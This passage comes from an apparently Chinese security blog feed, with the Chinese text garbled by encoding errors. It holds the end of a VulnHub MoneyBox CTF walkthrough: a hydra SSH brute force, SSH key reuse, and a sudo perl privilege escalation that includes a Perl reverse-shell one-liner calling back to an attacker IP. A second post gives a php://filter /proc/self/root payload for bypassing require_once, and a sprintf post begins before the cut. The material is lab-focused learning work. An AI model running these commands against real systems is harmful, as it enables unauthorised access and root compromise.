ä¸º 3xtr4ctd4t4</li></ul><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234441416.png" alt="image-20250425234441416"></p><p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> data.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425234600624.png" alt="image-20250425234600624"></p><p>AIç¿»è¯‘ä¸€ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ä½ å¥½â€¦â€¦ renu<br>æˆ‘è¦å‘Šè¯‰ä½ ä¸€äº›é‡è¦çš„äº‹ã€‚ä½ çš„å¯†ç å¤ªå¼±äº†ï¼Œæ‰€ä»¥æ›´æ”¹ä¸€ä¸‹ä½ çš„å¯†ç å§ã€‚<br>åˆ«å°çœ‹è¿™ä»¶äº‹â€¦â€¦<br></code></pre></td></tr></table></figure><h1 id="SSHæœåŠ¡æ¢æµ‹"><a href="#SSHæœåŠ¡æ¢æµ‹" class="headerlink" title="SSHæœåŠ¡æ¢æµ‹"></a>SSHæœåŠ¡æ¢æµ‹</h1><h3 id="ä½¿ç”¨hydraçˆ†ç ´å¯†ç "><a href="#ä½¿ç”¨hydraçˆ†ç ´å¯†ç " class="headerlink" title="ä½¿ç”¨hydraçˆ†ç ´å¯†ç "></a>ä½¿ç”¨<code>hydra</code>çˆ†ç ´å¯†ç </h3><p>åœ¨<code>data.txt</code>æ–‡ä»¶ä¸­å¾—åˆ°çš„ç”¨æˆ·å<code>renu</code>å°±æ˜¯<code>ssh</code>æœåŠ¡çš„ï¼Œå› ä¸ºå°±å‰©è¿™ä¸€ä¸ªæœåŠ¡äº†</p><p>æç¤ºå¯†ç å¤ªå¼±ï¼Œä½¿ç”¨<code>hydra</code>å·¥å…·å¯¹<code>ssh</code>æœåŠ¡è¿›è¡Œå¼±å£ä»¤çˆ†ç ´</p><p>åœ¨kaliçš„<code>/usr/share/wordlists/</code>ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå­—å…¸</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235415886.png" alt="image-20250425235415886"></p><p>å°†å…¶è§£å‹ç¼©</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235553250.png" alt="image-20250425235553250"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l renu -P rockyou.txt 192.168.1.102 ssh<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235646192.png" alt="image-20250425235646192"></p><p>å¾—åˆ°å¯†ç æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">987654321<br></code></pre></td></tr></table></figure><h3 id="SSHè¿œç¨‹ç™»å½•"><a href="#SSHè¿œç¨‹ç™»å½•" class="headerlink" title="SSHè¿œç¨‹ç™»å½•"></a><code>SSH</code>è¿œç¨‹ç™»å½•</h3><p>ç›´æ¥<code>ssh</code>è¿œç¨‹ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh renu@192.168.1.102<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235835395.png" alt="image-20250425235835395"></p><p>æˆåŠŸç™»å½•ï¼Œå…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250425235945856.png" alt="image-20250425235945856"></p><p>å‘ç°æœ‰ä¸ª<code>user1.txt</code>æ–‡ä»¶ï¼ŒæŸ¥çœ‹å¾—åˆ°ç¬¬ä¸€ä¸ªflag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user1.txt<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000034742.png" alt="image-20250426000034742"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r1&#123;F14g:0ku74tbd3777y4&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ª<code>ftp</code>ç›®å½•ï¼Œé‡Œé¢å°±æ˜¯åˆšæ‰åœ¨FTPæœåŠ¡å¾—åˆ°çš„å›¾ç‰‡</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000206950.png" alt="image-20250426000206950"></p><p>è¿”å›ä¸Šä¸€çº§ç›®å½•çœ‹çœ‹</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000351201.png" alt="image-20250426000351201"></p><p>å‘ç°è¿˜æœ‰ä¸€ä¸ª<code>lily</code>ç›®å½•ï¼Œè¯´æ˜è¿˜å­˜åœ¨ä¸€ä¸ª<code>lily</code>ç”¨æˆ·ï¼Œè¿›å…¥ç›®å½•çœ‹çœ‹ï¼Œå¾—åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426000506824.png" alt="image-20250426000506824"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">us3r&#123;F14g:tr5827r5wu6nklao&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ‡æ¢ä¸ºlilyç”¨æˆ·"><a href="#åˆ‡æ¢ä¸ºlilyç”¨æˆ·" class="headerlink" title="åˆ‡æ¢ä¸ºlilyç”¨æˆ·"></a>åˆ‡æ¢ä¸º<code>lily</code>ç”¨æˆ·</h3><p>æŸ¥çœ‹ä¸€ä¸‹å†å²å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002159693.png" alt="image-20250426002159693"></p><blockquote><p>çŒœæµ‹<code>ssh</code>ç™»å½•çš„è´¦æˆ·lilyä¸ºæœ¬æœºçš„<code>lily</code>ç”¨æˆ·ï¼Œé‚£ä¹ˆ<code>SSH</code>å…¬é’¥é…ç½®æ“ä½œå°±æ˜¯åœ¨æœ¬æœºä¸Šè¿›è¡Œçš„ï¼Œæ ¹æ®<code>SSH</code>å…¬é’¥å·¥ä½œæœºåˆ¶ï¼Œå¦‚æœ<code>renu</code>ç”¨æˆ·è¿›è¡Œäº†<code>ssh-keygen -t rsa</code>æ“ä½œï¼Œä¼šåœ¨<code>renu</code>çš„<code>~/.ssh/</code>ä¸­ç”Ÿæˆ<code>id_rsa</code>å’Œ<code>id_rsa.pub</code>æ–‡ä»¶</p></blockquote><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426001618917.png" alt="image-20250426001618917"></p><blockquote><p>åŒæ—¶ï¼Œå¦‚æœ<code>renu</code>ç”¨æˆ·è¿›è¡Œäº†<code>ssh-copy-id lily@192.168.43.80</code>æ“ä½œï¼Œå°†ä¼šæŠŠåˆšæ‰ç”Ÿæˆçš„<code>id_rsa.pub</code>æ‹·è´åˆ°<code>192.168.43.80</code>ä¸»æœºä¸Šçš„lilyè´¦æˆ·<code>ï½/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­ã€‚å¦‚æœ<code>192.168.43.80</code>ä¸Šçš„lilyç”¨æˆ·å°±æ˜¯æœ¬æœºçš„lilyç”¨æˆ·ï¼Œé‚£ä¹ˆ<code>lily</code>ç”¨æˆ·ä¸‹<code>~/.ssh/authorized_keys</code>æ–‡ä»¶ä¸­çš„å…¬é’¥åº”è¯¥ä¸<code>renu</code>ç”Ÿæˆçš„<code>id_rsa.pub</code>å…¬é’¥ä¸€è‡´</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_rsa.pub<br><span class="hljs-built_in">cd</span> /home/lily/.ssh/<br><span class="hljs-built_in">cat</span> authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002453872.png" alt="image-20250426002453872"></p><p>å¯ä»¥å‘ç°ä¸¤ä¸ªæ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œé‚£ä¹ˆ<code>renu</code>ç”¨æˆ·å¯ä»¥é€šè¿‡SSHå…¬é’¥éªŒè¯çš„æ–¹å¼ç™»é™†åˆ°æœ¬æœºçš„lilyçš„è´¦æˆ·ä¸Š</p><p>å°è¯•ç›´æ¥<code>su</code>åˆ°<code>lily</code>ç”¨æˆ·ï¼Œä½†æ˜¯éœ€è¦å¯†ç </p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426002935648.png" alt="image-20250426002935648"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa lily@192.168.1.102<br><span class="hljs-comment"># -i é€‰é¡¹ï¼Œç”¨äºæŒ‡å®šç§é’¥æ–‡ä»¶ id_rsaã€‚</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003043780.png" alt="image-20250426003043780"></p><h3 id="ææƒä¸ºroot"><a href="#ææƒä¸ºroot" class="headerlink" title="ææƒä¸ºroot"></a>ææƒä¸º<code>root</code></h3><p>æˆåŠŸç™»å½•ï¼Œå°è¯•è¿›è¡Œææƒï¼Œä½†æ˜¯ç›´æ¥ä½¿ç”¨<code>su</code>è¿˜æ˜¯éœ€è¦å¯†ç </p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003329930.png" alt="image-20250426003329930"></p><p>æŸ¥çœ‹å†å²å‘½ä»¤ï¼Œå‘ç°<code>lily</code>ç”¨æˆ·ç¼–è¾‘äº†<code>sudoers</code>ï¼Œå¹¶ä¸”æŸ¥æ‰¾äº†ä¸€äº›å…·æœ‰<code>suid</code>æƒé™çš„æ–‡ä»¶ï¼Œæ‰§è¡Œäº†<code>sudo -l</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003425435.png" alt="image-20250426003425435"></p><p>çœ‹çœ‹å½“å‰ç”¨æˆ·å¯ç”¨çš„<code>sudo</code>æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003730564.png" alt="image-20250426003730564"></p><p>å‘ç°å¯ä»¥ä½¿ç”¨<code>perl</code>å‘½ä»¤</p><p>å‚è€ƒææƒç½‘ç«™ï¼š<a href="https://gtfobins.github.io/gtfobins/perl/">https://gtfobins.github.io/gtfobins/perl/</a></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426003845131.png" alt="image-20250426003845131"></p><p>å¯ä»¥ç›´æ¥ææƒï¼Œä¹Ÿå¯ä»¥åå¼¹<code>shell</code></p><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹<code>shell</code></h4><p>åœ¨<code>kali</code>ç›‘å¬<code>2333</code>ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004313655.png" alt="image-20250426004313655"></p><p>é¶æœºè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ŒåŠ ä¸Š<code>sudo</code>å¯ä»¥æå‡æƒé™æ‰§è¡Œ<code>perl</code>å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;192.168.1.103&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004720854.png" alt="image-20250426004720854"></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004801020.png" alt="image-20250426004801020"></p><p>æˆåŠŸåå¼¹<code>shell</code>ï¼Œå¹¶ä¸”æ˜¯<code>root</code>æƒé™ï¼Œåœ¨<code>/root</code>ç›®å½•ä¸‹æ‰¾åˆ°éšè—æ–‡ä»¶<code>.root.txt</code>å¾—åˆ°<code>rootflag</code></p><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426004839093.png" alt="image-20250426004839093"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure><h4 id="ç›´æ¥ç”¨perlææƒ"><a href="#ç›´æ¥ç”¨perlææƒ" class="headerlink" title="ç›´æ¥ç”¨perlææƒ"></a>ç›´æ¥ç”¨<code>perl</code>ææƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/26/VulnHub%E9%9D%B6%E6%9C%BAMoneyBox%E5%A4%8D%E7%8E%B0/image-20250426005156575.png" alt="image-20250426005156575"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r00t&#123;H4ckth3p14n3t&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æ‰“é¶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¸—é€ æ‰“é¶ å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¦å·é“¾æ¥çªç ´ç›®å½•é™åˆ¶</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E7%AA%81%E7%A0%B4%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿˜æƒ³éé¢„æœŸ?&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨ PHP ä¸­ï¼Œ<code>require_once</code> å’Œ <code>include_once</code> åœ¨è°ƒç”¨æ—¶PHP ä¼šå…ˆæ£€æŸ¥ä¸€ä¸ªå†…éƒ¨çš„è®°å½•ç»“æ„ï¼ˆå¯è¿‘ä¼¼ç†è§£ä¸ºå“ˆå¸Œè¡¨ï¼Œå­˜å‚¨å·²åŒ…å«æ–‡ä»¶çš„è·¯å¾„ä¿¡æ¯ï¼‰ï¼Œçœ‹è¦åŒ…å«çš„æ–‡ä»¶è·¯å¾„æ˜¯å¦å·²ç»å­˜åœ¨äºå…¶ä¸­ã€‚å¦‚æœå­˜åœ¨ï¼Œå°±ä¸å†é‡å¤æ‰§è¡ŒåŒ…å«æ“ä½œï¼›å¦‚æœä¸å­˜åœ¨ï¼Œæ‰ä¼šå°†æ–‡ä»¶å†…å®¹åŒ…å«è¿›æ¥ï¼Œå¹¶æŠŠè¯¥æ–‡ä»¶çš„è·¯å¾„è®°å½•åˆ°è¿™ä¸ªç»“æ„ä¸­</p><h4 id="å°çŸ¥è¯†ç‚¹"><a href="#å°çŸ¥è¯†ç‚¹" class="headerlink" title="å°çŸ¥è¯†ç‚¹"></a><strong>å°çŸ¥è¯†ç‚¹</strong></h4><p><code>/proc/self</code>ï¼šåœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ&#x2F;proc æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å‚¨ç€å½“å‰ç³»ç»Ÿè¿è¡Œè¿›ç¨‹çš„ç›¸å…³ä¿¡æ¯ï¼Œ&#x2F;proc&#x2F;selfæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç¬¦å·é“¾æ¥ï¼Œå®ƒä¼šåŠ¨æ€æŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œè¿›ç¨‹å¯¹åº”çš„ <code>/proc/</code> ä¸‹çš„å…·ä½“è¿›ç¨‹ç›®å½•ï¼ˆç›®å½•åæ˜¯è¿›ç¨‹ IDï¼Œå³ <code>/proc/pid/</code> ï¼‰ã€‚ä¾‹å¦‚ï¼Œè‹¥å½“å‰è¿›ç¨‹ ID æ˜¯ <code>1234</code> ï¼Œé‚£ä¹ˆ <code>/proc/self</code> å°±ç­‰åŒäº <code>/proc/1234/</code></p><p><code>/proc/self/root</code>ï¼šå®ƒä¹Ÿæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘ç³»ç»Ÿçš„æ ¹ç›®å½•ï¼ˆ<code>/</code> ï¼‰ ã€‚åœ¨ä¸€äº›å—é™åˆ¶çš„ç¯å¢ƒï¼ˆå¦‚å®¹å™¨ç¯å¢ƒ ï¼‰ä¸­ï¼Œé€šè¿‡è¿™ä¸ªç¬¦å·é“¾æ¥å¯ä»¥çªç ´å½“å‰ç›®å½•é™åˆ¶ï¼Œè®¿é—®åˆ°ç³»ç»Ÿæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><h4 id="ç¬¦å·é“¾æ¥"><a href="#ç¬¦å·é“¾æ¥" class="headerlink" title="ç¬¦å·é“¾æ¥"></a><strong>ç¬¦å·é“¾æ¥</strong></h4><p>ç¬¦å·é“¾æ¥ä¹Ÿå«åšè½¯è¿æ¥ï¼Œæ˜¯ä¸€ç±»ç‰¹æ®Šæ–‡ä»¶ï¼Œå…¶æœ¬è´¨æ˜¯åŒ…å«æŒ‡å‘å…¶ä»–æ–‡ä»¶æˆ–ç›®å½•çš„å¼•ç”¨çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè¯¥å¼•ç”¨ä»¥ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„å½¢å¼å­˜åœ¨</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>starven_secret.php<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç¬¦å·é“¾æ¥<code>/proc/self/root</code>çªç ´ç›®å½•é™åˆ¶ï¼Œ<code>/proc/self/root</code>ä½œä¸ºæŒ‡å‘æ ¹ç›®å½•çš„ç¬¦å·é“¾æ¥ï¼Œå¤šæ¬¡ä½¿ç”¨å¯çªç ´ä»£ç å¯èƒ½å­˜åœ¨çš„å½“å‰ç›®å½•èŒƒå›´é™åˆ¶</p><p>å¯ä»¥åˆ©ç”¨<code>/proc/self/root</code>ï¼Œå¯ä»¥æ„é€ å‡ºæŒ‡å‘ä»»æ„æ–‡ä»¶çš„è·¯å¾„ï¼Œå³ä½¿ä»£ç æ²¡ç”¨ç›´æ¥è®¿é—®<code>/var/www/html/starven_secret.php</code>çš„æƒé™ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>/proc/self/root</code>é€æ­¥å¯¼èˆªåˆ°ç›®æ ‡æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼Œä»è€Œç»•è¿‡å¯èƒ½å­˜åœ¨çš„ç›®å½•è®¿é—®é™åˆ¶ï¼Œå®ç°å¯¹æ•æ„Ÿæ–‡ä»¶çš„è®¿é—®</p>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sprintfæ¼æ´</title>
    <link href="/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/04/25/sprintf%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="sprintfå‡½æ•°"><a href="#sprintfå‡½æ•°" class="headerlink" title="sprintfå‡½æ•°"></a><code>sprintf</code>å‡½æ•°</h1><h3 id="å‡½æ•°åŠŸèƒ½"><a href="#å‡½æ•°åŠŸèƒ½" class="headerlink" title="å‡½æ•°åŠŸèƒ½"></a>å‡½æ•°åŠŸèƒ½</h3><p><code>sprintf</code>æ˜¯ PHP ä¸­ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯æ ¹æ®æŒ‡å®šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°†ä¸€ç³»åˆ—å‚æ•°è½¬æ¢å¹¶æ ¼å¼åŒ–ä¸ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²</p><h3 id="å‡½æ•°è¯­æ³•"><a href="#å‡½æ•°è¯­æ³•" class="headerlink" title="å‡½æ•°è¯­æ³•"></a>å‡½æ•°è¯­æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">sprintf</span>(format, arg1, arg2,...)<br></code></pre></td></tr></table></figure><ul><li><code>format</code>ï¼šæ˜¯å¿…éœ€å‚æ•°ï¼Œè§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡ï¼Œå¦‚æœ <code>format</code> å­—ç¬¦ä¸²ä¸­ä¸åŒ…å«ä»»ä½•å ä½ç¬¦ï¼ˆå¦‚ <code>%s</code>ã€<code>%d</code> ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ä¸éœ€è¦é¢å¤–çš„ <code>arg</code> å‚æ•°</li><li><code>arg1, arg2,...</code>ï¼šå¯é€‰å‚æ•°ï¼Œè¦è¢«æ’å…¥åˆ°<code>format</code>å­—ç¬¦ä¸²ä¸­æŒ‡å®šä½ç½®çš„å‚æ•°ï¼Œå¯ä»¥æœ‰å¤šä¸ª</li></ul><table><thead><tr><th align="center">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="center">format</td><td align="left">å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡ã€‚å¯èƒ½çš„æ ¼å¼å€¼ï¼š<br/><br/>%% - è¿”å›ä¸€ä¸ªç™¾åˆ†å· %<br/><br/>%b - äºŒè¿›åˆ¶æ•°<br/><br/>%c - ASCII å€¼å¯¹åº”çš„å­—ç¬¦<br/><br/>%d - åŒ…å«æ­£è´Ÿå·çš„åè¿›åˆ¶æ•°ï¼ˆè´Ÿæ•°ã€0ã€æ­£æ•°ï¼‰<br/><br/>%e - ä½¿ç”¨å°å†™çš„ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ 1.2e+2ï¼‰<br/><br/>%E - ä½¿ç”¨å¤§å†™çš„ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ 1.2E+2ï¼‰<br/><br/>%u - ä¸åŒ…å«æ­£è´Ÿå·çš„åè¿›åˆ¶æ•°ï¼ˆå¤§äºç­‰äº 0ï¼‰<br/><br/>%f - æµ®ç‚¹æ•°ï¼ˆæœ¬åœ°è®¾ç½®ï¼‰<br/><br/>%F - æµ®ç‚¹æ•°ï¼ˆéæœ¬åœ°è®¾ç½®ï¼‰<br/><br/>%g - è¾ƒçŸ­çš„ %e å’Œ %f<br/><br/>%G - è¾ƒçŸ­çš„ %E å’Œ %f<br/><br/>%o - å…«è¿›åˆ¶æ•°<br/><br/>%s - å­—ç¬¦ä¸²<br/><br/>%x - 